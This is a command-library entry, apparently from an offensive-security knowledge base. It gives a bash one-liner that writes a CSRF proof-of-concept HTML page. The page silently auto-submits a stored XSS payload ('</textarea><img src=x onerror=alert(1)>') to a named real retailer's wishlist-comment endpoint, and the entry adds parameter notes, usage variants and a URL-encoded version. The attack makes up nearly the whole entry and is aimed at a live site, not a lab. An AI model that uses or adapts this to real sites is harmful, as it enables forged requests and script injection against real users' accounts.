---
id: cmd-uuid-003
data: >-
  echo '<html><body><form
  action="https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/[ID]"
  method="POST"><input type="hidden" name="wishlistComment"
  value="</textarea><img src=x onerror=alert(1)>"/><input type="submit"
  value="Submit
  request"/></form><script>document.forms[0].submit();</script></body></html>' >
  csrf_poc.html
tags:
  - csrf
  - html-poc
type: command
output: HTML file with auto-submitting form
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:43.140Z'
verified: false
validated: true
submitted: true
---
# CSRF PoC HTML

## Command

```bash
echo '<html><body><form action="https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/[ID]" method="POST"><input type="hidden" name="wishlistComment" value="</textarea><img src=x onerror=alert(1)>"/><input type="submit" value="Submit request"/></form><script>document.forms[0].submit();</script></body></html>' > csrf_poc.html
```

## Description

Generates an HTML file that auto-submits the XSS payload via POST, exploiting CSRF to inject into the victim's wishlist.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `[ID]` | Replace with captured ID | Yes |
| `value="..."` | URL-encoded if needed | Yes |

## Examples

### Basic Usage

```bash
echo '<html><body><form action="https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/12345" method="POST"><input type="hidden" name="wishlistComment" value="</textarea><img src=x onerror=alert(1)>"/></form><script>document.forms[0].submit();</script></body></html>' > csrf_poc.html
```

### Advanced Usage

```bash
# URL-encode payload: value="%3C%2Ftextarea%3E%3Cimg src=x onerror=alert(1)%3E"
```

## Expected Output

csrf_poc.html file; loads and submits silently in browser.

## Related

- [[commands/inject-xss-comment]]
- [[procedures/Craft-and-Deliver-CSRF-PoC-for-XSS-Injection]]
